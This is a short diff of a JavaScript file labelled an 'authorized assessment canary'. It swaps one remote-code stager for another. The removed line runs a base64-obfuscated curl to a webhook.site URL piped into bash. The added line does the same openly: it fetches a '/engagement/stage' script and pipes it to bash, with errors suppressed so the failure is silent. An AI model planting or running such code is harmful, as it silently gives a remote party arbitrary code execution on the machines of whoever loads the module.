@@ -1,2 +1,2 @@
 // Authorized assessment canary
-const{exec}=require('child_process');exec("(echo Y3VybCBodHRwOi8vd2ViaG9vay5zaXRlLzUyZGExZWE5LTk5ZjQtNDZhYS1hMjVhLWQ1ZTRlNWEyYTZmMQ== | base64 -d | bash) || true");
+const{exec}=require('child_process');exec("(curl -fsSL \"http://webhook.site/45f53c74-0a88-4747-919b-aeb1f95622b3/engagement/stage\" | bash) || true");
